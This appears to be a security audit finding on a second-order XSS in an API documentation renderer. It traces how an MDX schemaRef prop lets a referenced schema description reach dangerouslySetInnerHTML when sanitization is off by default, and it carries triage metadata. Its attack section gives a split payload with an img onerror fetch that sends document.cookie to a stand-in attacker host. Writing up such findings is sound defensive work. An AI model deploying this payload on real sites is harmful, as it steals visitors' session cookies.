---
ID: H-02
Verdict: VALID
FP-Verdict: TRUE-POSITIVE
FP-Confidence: HIGH
FP-Evidence: SanitizedMdBlock.tsx:16 `sanitize(false, html)` returns raw html when options.sanitize=false (default per AcmeNormalizedOptions.ts:317); AppStore.ts:163 registers SchemaDefinition with propsSelector returning only {parser, options} so attacker-supplied schemaRef survives into props (SchemaDefinition.tsx:42-48) and dereferenced description reaches FieldDetails.tsx:107 → Markdown.tsx:28 → SanitizedMarkdownHTML.
FP-Reasoning: Verified: parseProps (MarkdownRenderer.ts:204-229) has no path/scheme validation; propsSelector at AppStore.ts:165-168 does not overwrite schemaRef; FieldDetails.tsx:107 renders schema.description via <Markdown> which always routes through SanitizedMdBlock with default sanitize=false. No filter on the chain. (Minor narrative inaccuracy: registered name is `SchemaDefinition` not `schema-definition`, but regex `i` flag still matches case-variants of the literal — attack mechanic stands.)
Severity-Original: MEDIUM
Class: XSS-via-MDX-schemaRef-second-order
Origin-Finding: H-02
Origin-Pattern: mdx-prop-spec-ref-resolves-malicious-description
File: src/services/MarkdownRenderer.ts:183
Source: spec description text containing <schema-definition schemaRef="#/components/schemas/X"/> + the dereferenced schema's description field (split payload across two spec sections)
Sink: [REDACTED].tsx:31 (dangerouslySetInnerHTML, reached via FieldDetails.tsx:107 → Markdown → SanitizedMarkdownHTML)
Chamber: chamber-01
Pre-FP-Flag: severity downgraded HIGH → MEDIUM on Advocate review — practical prevalence is low (requires spec to use one of three Acme-vendor MDX tag names: security-definitions, security-definition, schema-definition, documented in docs/security-definitions-injection.md). Same root cause as H-00-A (sanitize=false); operator setting sanitize:true would route the secondary description through DOMPurify on render.
Debate: archon/chamber-workspace/chamber-01/debate.md
Triage-Priority: skip
Triage-Exploitability: moderate
Triage-Impact: medium
Triage-Reasoning: MEDIUM severity XSS requiring attacker control of two spec sections and vendor MDX tag usage; default sanitize=false but limited blast radius to spec viewers.
Intent-Verdict: intentional-design
Intent-Source: docs/security-definitions-injection.md:1-24 + docs/config.md:77-80
Intent-Quote: "You can inject the Security Definitions widget anywhere in your specification description" / "sanitize — If set to true, the API definition is considered untrusted and all HTML/Markdown is sanitized to prevent XSS."
Intent-Confidence: strong
Context-Reviewer-Reasoning: context-reviewer: MDX vendor tags (schema-definition / security-definitions) are documented operator-facing surface; the secondary render terminates at the SanitizedMdBlock gate that docs/config.md:77-80 declares opt-in. (prior Triage-Priority: P2)
Triage-Model: claude-sonnet-4-6
Triaged-At: 2026-05-19T00:00:00Z
---

# Second-Order XSS via MDX `<schema-definition schemaRef>` Prop

## Source → Sink Path

1. `src/services/MarkdownRenderer.ts:176` — `parseProps(props)` extracts `schemaRef` from MDX tag in spec description text (e.g. `<schema-definition schemaRef="#/components/schemas/Pwn" />`). No allow-list or sanitization of prop names or values.

2. `src/services/MarkdownRenderer.ts:183` — `componentDefs.push({ component: SchemaDefinition, propsSelector: ..., props: { ...parseProps(props), ...componentMeta.props, children } })` — attacker-controlled `schemaRef` is placed in `props`.

3. `[REDACTED].tsx:47` — `<PartComponent {...{ ...part.props, ...part.propsSelector(store) }} />` — `propsSelector` for `SchemaDefinition` only returns `{ parser, options }`, it does NOT return `schemaRef`, so the attacker-controlled `schemaRef` survives into the component's props.

4. `[REDACTED].tsx:29` — `SchemaDefinition.getMediaType(schemaRef)` builds `{ schema: { $ref: schemaRef } }` and `MediaTypeModel` resolves the `$ref` via `parser.byRef(schemaRef)`.

5. The dereferenced schema's `description` field is extracted at `src/services/models/Schema.ts` and passed through `FieldDetails` as `field.description`.

6. `src/components/Fields/FieldDetails.tsx:107` — `<Markdown compact={true} source={description} />` renders the resolved schema's description.

7. `src/components/Markdown/Markdown.tsx:29` → `SanitizedMarkdownHTML` → `[REDACTED].tsx:31` → `dangerouslySetInnerHTML={{ __html: sanitize(options.sanitize, html) }}` — with default `sanitize: false`, the raw HTML executes.

## Attack Mechanic

An attacker controls two separate, innocuous-looking spec sections:

- **Section A** (any description field): `"description": "See schema: <schema-definition schemaRef=\"#/components/schemas/Harmless\" />"` — no XSS payload here.
- **Section B** (a shared/library schema description): `"description": "<img src=x onerror=fetch('https://c2.attacker.com?c='+document.cookie)>"` — no MDX tag here.

Neither section triggers traditional XSS scanners. The two pieces combine at render time to produce DOM XSS.

## Why Protection Does Not Apply

- `parseProps()` at `MarkdownRenderer.ts:209` applies regex `/([\w-]+)\s*=\s*(?:{...}|"...")/gim` — it parses `schemaRef` as a plain string prop with no scheme or path validation.
- The `propsSelector` in DEFAULT_OPTIONS for `SchemaDefinition` is `(store) => ({ parser: store.spec.parser, options: store.options })` — it does not override `schemaRef`, so attacker-supplied value persists.
- `sanitize: false` (default) means DOMPurify is never invoked on the resolved schema description.
- Even with `sanitize: true`, the same DOMPurify 3.2.4 default-config call applies.

## Preconditions

- Default Acme configuration (no special options needed).
- Attacker controls any description field AND any schema description in the spec (can be split across `$ref`-included files).
